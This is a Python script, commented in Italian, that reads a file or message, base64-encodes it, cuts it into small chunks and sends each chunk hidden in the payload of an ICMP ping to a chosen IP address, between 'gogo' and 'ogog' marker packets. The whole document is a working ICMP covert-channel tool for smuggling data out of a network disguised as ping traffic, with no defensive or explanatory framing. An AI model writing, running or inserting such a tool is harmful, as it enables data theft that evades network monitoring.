import argparse
from scapy.all import send, IP, ICMP
import base64

def send_custom_ping(destination_ip, message):
    print(f"Invio del messaggio: {message.decode('utf-8', errors='ignore')}")  # Stampare il messaggio prima di inviarlo
    packet = IP(dst=destination_ip) / ICMP() / message
    send(packet)

def file_to_base64(file_path):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
        return base64.b64encode(file_data).decode('utf-8')
    except Exception as e:
        print(f"Errore: {e}")
        return None

def split_base_64_string(base64_string, chunk_size=4):
    chunks = [base64_string[i:i + chunk_size] for i in range(0, len(base64_string), chunk_size)]
    chunks = [chunk.encode('utf-8') for chunk in chunks]
    return chunks

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Invia un ping ICMP personalizzato e gestisci file Base64.')
    parser.add_argument('-t', '--target', required=True, help='IP del destinatario')
    parser.add_argument('-f', '--file', help='Percorso del file da caricare')
    parser.add_argument('-m', '--message', help='Messaggio da inviare')
    parser.add_argument('-s', '--size', type=int, default=4, help='Dimensione dei messaggi in byte (default: 4)')

    args = parser.parse_args()

    if args.file and args.message:
        print("Errore: non puoi specificare sia -f che -m contemporaneamente.")
        exit(1)
    elif not (args.file or args.message):
        print("Errore: devi specificare almeno una delle opzioni -f o -m.")
        exit(1)

    messages_to_send = []

    if args.file:
        base64_data = file_to_base64(args.file)
        if base64_data:
            messages_to_send = split_base_64_string(base64_data, args.size)
    elif args.message:
        base64_message = base64.b64encode(args.message.encode('utf-8')).decode('utf-8')
        messages_to_send = split_base_64_string(base64_message, args.size)

    send_custom_ping(args.target, "gogo".encode('utf-8'))
    for message in messages_to_send:
        send_custom_ping(args.target, message)
    send_custom_ping(args.target, "ogog".encode('utf-8'))
